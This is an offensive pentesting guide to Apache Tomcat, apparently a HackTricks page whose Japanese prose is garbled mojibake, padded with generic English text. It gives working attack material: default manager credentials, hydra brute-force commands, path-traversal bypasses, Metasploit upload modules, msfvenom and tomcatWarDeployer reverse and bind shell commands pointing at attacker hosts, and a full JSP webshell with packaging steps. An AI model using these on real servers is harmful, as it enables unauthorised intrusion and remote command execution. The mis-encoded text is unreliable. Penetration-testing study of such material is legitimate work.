# Tomcat

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricks repo](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æœ€ã‚‚é‡è¦ãªè„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã¦ä¿®æ­£ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã—ã‚‡ã†ã€‚Intruderã¯æ”»æ’ƒå¯¾è±¡ã‚’è¿½è·¡ã—ã€ç©æ¥µçš„ãªè„…å¨ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã—ã€APIã‹ã‚‰Webã‚¢ãƒ—ãƒªã¾ã§ã€ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã«ã‚ãŸã‚‹å•é¡Œã‚’è¦‹ã¤ã‘ã¾ã™ã€‚[**ç„¡æ–™ã§ãŠè©¦ã—ãã ã•ã„**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## ãƒ‡ã‚£ã‚¹ã‚«ãƒãƒªãƒ¼

* é€šå¸¸ã¯**ãƒãƒ¼ãƒˆ8080**ã§å®Ÿè¡Œã•ã‚Œã¾ã™
* **ä¸€èˆ¬çš„ãªTomcatã‚¨ãƒ©ãƒ¼ï¼š**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## åˆ—æŒ™

### ãƒãƒ¼ã‚¸ãƒ§ãƒ³
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author"
```
### ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€ã‚’ç‰¹å®šã™ã‚‹

**`/manager`** ã¨ **`/host-manager`** ã®ãƒšãƒ¼ã‚¸ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’è¦‹ã¤ã‘ã‚‹ã®ã¯èˆˆå‘³æ·±ã„ã§ã™ã€‚ã“ã‚Œã‚‰ã®ãƒšãƒ¼ã‚¸ã¯ç•°ãªã‚‹åå‰ã‚’æŒã¤å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®åˆ—æŒ™

Tomcat6ä»¥å‰ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è³‡æ ¼æƒ…å ±

Tomcatã®æœ€ã‚‚èˆˆå‘³æ·±ã„ãƒ‘ã‚¹ã¯_**/manager/html**_ã§ã™ã€‚ã“ã®ãƒ‘ã‚¹ã§ã¯ã€**warãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦å±•é–‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼‰ã€‚ãŸã ã—ã€ã“ã®ãƒ‘ã‚¹ã¯åŸºæœ¬çš„ãªHTTPèªè¨¼ã§ä¿è­·ã•ã‚Œã¦ã„ã¾ã™ã€‚æœ€ã‚‚ä¸€èˆ¬çš„ãªè³‡æ ¼æƒ…å ±ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* admin:admin
* tomcat:tomcat
* admin:\<ä½•ã‚‚å…¥åŠ›ã—ãªã„>
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

ã“ã‚Œã‚‰ã¨ä»–ã®è³‡æ ¼æƒ…å ±ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
ã‚‚ã†ä¸€ã¤ã®èˆˆå‘³æ·±ã„Tomcatã®ãƒ‘ã‚¹ã¯`/manager/status`ã§ã™ã€‚ã“ã“ã§ã¯OSã¨Tomcatã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€`/manager/html`ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„å ´åˆã«ã€Tomcatã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒ
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST tomacat-site.internal
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <IP>
```
## è„†å¼±æ€§

### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹ã®æ¼æ´©

`/auth.jsp` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¦ã€éå¸¸ã«å¹¸é‹ãªå ´åˆã«ã¯ã€**ãƒãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæ¼æ´©ã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“**ã€‚

### äºŒé‡URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰

ã‚ˆãçŸ¥ã‚‰ã‚ŒãŸè„†å¼±æ€§ã§ã‚ã‚‹CVE-2007-1860ã§ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒãƒ¼ã‚¸ãƒ£ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®æ‰‹æ®µã¨ã—ã¦ã€**äºŒé‡URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã®ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«**ãŒå¯èƒ½ã§ã™ã€‚

Tomcatã®ç®¡ç†ã‚¦ã‚§ãƒ–ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¾ã™: _pathTomcat/%252E%252E/manager/html_

Webã‚·ã‚§ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«ã¯ã€äºŒé‡URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã€ã‚¯ãƒƒã‚­ãƒ¼ã‚„SSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚‚é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ãƒãƒƒã‚¯ãƒ‰ã‚¢ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€äºŒé‡URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

### /examples

ä»¥ä¸‹ã®ä¾‹ç¤ºã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€Apache Tomcat v4.x - v7.xã«ä»˜å±ã—ã¦ãŠã‚Šã€æ”»æ’ƒè€…ãŒã‚·ã‚¹ãƒ†ãƒ ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼ˆXSSï¼‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚‚è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ï¼ˆ[ã“ã“ã‹ã‚‰](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)ï¼‰ã€‚

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ï¼ˆ..;/ï¼‰

ä¸€éƒ¨ã®[**è„†å¼±ãªTomcatã®è¨­å®š**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)ã§ã¯ã€ãƒ‘ã‚¹ `/..;/` ã‚’ä½¿ç”¨ã—ã¦Tomcatã®ä¿è­·ã•ã‚ŒãŸãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ä¾‹ãˆã°ã€`www.vulnerable.com/lalala/..;/manager/html` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€**Tomcatãƒãƒãƒ¼ã‚¸ãƒ£**ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã“ã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ä¿è­·ã•ã‚ŒãŸãƒ‘ã‚¹ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹**åˆ¥ã®æ–¹æ³•**ã¯ã€`http://www.vulnerable.com/;param=value/manager/html` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã™ã€‚

## RCE

æœ€å¾Œã«ã€Tomcat Web Application Managerã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€**.warãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦å±•é–‹ã™ã‚‹ã“ã¨ã§ï¼ˆã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼‰**ã€‚

### åˆ¶é™äº‹é …

WARãƒ•ã‚¡ã‚¤ãƒ«ã‚’å±•é–‹ã§ãã‚‹ã®ã¯ã€**ååˆ†ãªæ¨©é™ï¼ˆãƒ­ãƒ¼ãƒ«: adminã€managerã€manager-scriptï¼‰**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã®ã¿ã§ã™ã€‚ã“ã‚Œã‚‰ã®è©³ç´°ã¯é€šå¸¸ã€`/usr/share/tomcat9/etc/tomcat-users.xml`ã«å®šç¾©ã•ã‚Œã¦ã„ã‚‹`tomcat-users.xml`ã®ä¸‹ã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ï¼‰ï¼ˆ[POST ](tomcat.md#post)sectionã‚’å‚ç…§ï¼‰ã€‚
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit is a powerful framework for penetration testing and exploiting vulnerabilities in network services. It provides a wide range of tools and modules that can be used to identify and exploit security weaknesses in target systems.

Metasploit is designed to be user-friendly and flexible, allowing both novice and experienced hackers to effectively carry out their attacks. It supports various exploitation techniques, including remote code execution, privilege escalation, and post-exploitation activities.

One of the key features of Metasploit is its extensive database of exploits, payloads, and auxiliary modules. These modules can be easily customized and combined to create complex attack scenarios. Metasploit also provides a command-line interface and a graphical user interface, making it accessible to users with different levels of technical expertise.

In addition to its exploitation capabilities, Metasploit also includes features for vulnerability scanning, password cracking, and social engineering. It supports a wide range of network protocols and services, including HTTP, FTP, SSH, and SMB.

Metasploit is constantly updated with new exploits and modules, making it a valuable tool for both offensive and defensive security professionals. However, it is important to note that the use of Metasploit for unauthorized activities is illegal and unethical. It should only be used for legitimate purposes, such as penetration testing and security research.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«

MSFVenomã¯ã€Metasploit Frameworkã®ä¸€éƒ¨ã§ã‚ã‚Šã€æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã‹ã‚‰æ”»æ’ƒè€…ã®ãƒã‚·ãƒ³ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ä¸€ç¨®ã®ã‚·ã‚§ãƒ«ã§ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€MSFVenomã‚’ä½¿ç”¨ã—ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f war > shell.war
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã§ã¯ã€`java/jsp_shell_reverse_tcp`ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€æ”»æ’ƒè€…ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒ¼ãƒˆç•ªå·ã‚’æŒ‡å®šã—ã¦ã„ã¾ã™ã€‚ç”Ÿæˆã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€`shell.war`ã¨ã„ã†åå‰ã®WARãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

ã“ã®ç”Ÿæˆã•ã‚ŒãŸWARãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®Tomcatã‚µãƒ¼ãƒãƒ¼ã«ãƒ‡ãƒ—ãƒ­ã‚¤ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã«å¯¾ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
```
æ¬¡ã«ã€**`revshell.war`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ï¼ˆ**_**/revshell/**_**ï¼‰**

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ³ãƒ‰ã‚·ã‚§ãƒ«ã¨ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’ä½œæˆã™ã‚‹

ä¸€éƒ¨ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã“ã‚ŒãŒæ©Ÿèƒ½ã—ãªã„ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼ˆãŸã¨ãˆã°å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®sunï¼‰

#### ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in penetration testing to gain control over a compromised system.

To create a reverse shell, the attacker typically needs to exploit a vulnerability in a network service running on the target machine. Once the vulnerability is exploited, the attacker can inject malicious code that establishes a connection back to their machine.

There are various tools and techniques available for creating reverse shells, including using netcat, Python, or Metasploit. The choice of tool depends on the specific requirements of the penetration test and the target environment.

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used in controlled environments with proper authorization and consent.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### ãƒã‚¤ãƒ³ãƒ‰ã‚·ã‚§ãƒ«

A bind shell is a type of shell that allows an attacker to gain remote access to a compromised system. It works by binding a shell to a specific port on the target system, allowing the attacker to connect to that port and gain control over the system. 

To create a bind shell, the attacker typically exploits a vulnerability in a network service running on the target system, such as a web server or an FTP server. Once the vulnerability is exploited, the attacker can execute a command that starts a shell and binds it to a specific port. 

Once the bind shell is established, the attacker can use a client program, such as Netcat, to connect to the target system on the specified port. This allows the attacker to interact with the shell and execute commands on the compromised system. 

Bind shells are commonly used in penetration testing and hacking activities to gain unauthorized access to systems. It is important for system administrators to be aware of the risks associated with bind shells and take appropriate measures to secure their systems against such attacks.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### [Culsterd](https://github.com/hatRiot/clusterd)ã®ä½¿ç”¨

Culsterdã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Tomcatã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã™ã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚Culsterdã¯ã€Tomcatã‚µãƒ¼ãƒãƒ¼ã®è„†å¼±æ€§ã‚’æ¤œå‡ºã—ã€æ”»æ’ƒè€…ãŒæ‚ªæ„ã®ã‚ã‚‹æ“ä½œã‚’è¡Œã†ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æä¾›ã—ã¾ã™ã€‚

Culsterdã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€ã¾ãšCulsterdã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã«ã€Culsterdã‚’å®Ÿè¡Œã—ã€Tomcatã‚µãƒ¼ãƒãƒ¼ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒ¼ãƒˆç•ªå·ã‚’æŒ‡å®šã—ã¾ã™ã€‚Culsterdã¯ã€æŒ‡å®šã•ã‚ŒãŸIPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒ¼ãƒˆç•ªå·ã«æ¥ç¶šã—ã€Tomcatã‚µãƒ¼ãƒãƒ¼ã®è„†å¼±æ€§ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ã€‚

Culsterdã¯ã€è„†å¼±æ€§ã®ã‚ã‚‹Tomcatãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç‰¹å®šã—ã€æ”»æ’ƒè€…ãŒæ‚ªæ„ã®ã‚ã‚‹æ“ä½œã‚’è¡Œã†ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯Tomcatã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦æ§˜ã€…ãªæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Culsterdã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã¯ã€æ…é‡ã«è¡Œå‹•ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ­£å½“ãªç›®çš„ã§ã®ã¿ä½¿ç”¨ã—ã€é©åˆ‡ãªè¨±å¯ã‚’å¾—ãŸå ´åˆã«ã®ã¿å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚ã¾ãŸã€Culsterdã‚’ä½¿ç”¨ã™ã‚‹å‰ã«ã€æ³•çš„ãŠã‚ˆã³å€«ç†çš„ãªåˆ¶ç´„ã‚’ç†è§£ã—ã€éµå®ˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

Culsterdã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Tomcatã‚µãƒ¼ãƒãƒ¼ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢ã™ã‚‹æ´å¯Ÿã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã‚’ç‰¹å®šã—ã€é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### æ‰‹å‹•æ–¹æ³• - ã‚¦ã‚§ãƒ–ã‚·ã‚§ãƒ«

ã“ã®[ã‚³ãƒ³ãƒ†ãƒ³ãƒ„](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ã‚’ä½¿ç”¨ã—ã¦ã€**index.jsp**ã‚’ä½œæˆã—ã¦ãã ã•ã„ã€‚
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
